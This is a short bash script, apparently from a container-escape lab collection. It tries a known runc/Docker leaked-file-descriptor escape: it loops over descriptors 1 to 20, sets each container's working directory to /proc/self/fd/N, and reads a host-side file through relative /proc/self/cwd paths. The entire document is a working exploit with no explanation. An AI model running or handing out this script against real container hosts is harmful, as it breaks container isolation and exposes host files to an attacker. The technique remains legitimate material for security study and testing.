#!/bin/bash
for i in {1..20}; do
    docker run --rm -w /proc/self/fd/$i alpine:3.14.3 sh -c "echo TRYING FD $i && cat /proc/self/cwd/../../../houdini/tricks/HostMount/61240abcc5412ab41c9a4c44be7e898666c8bb9c650bf8985b8ae2ee8d4160ce"
done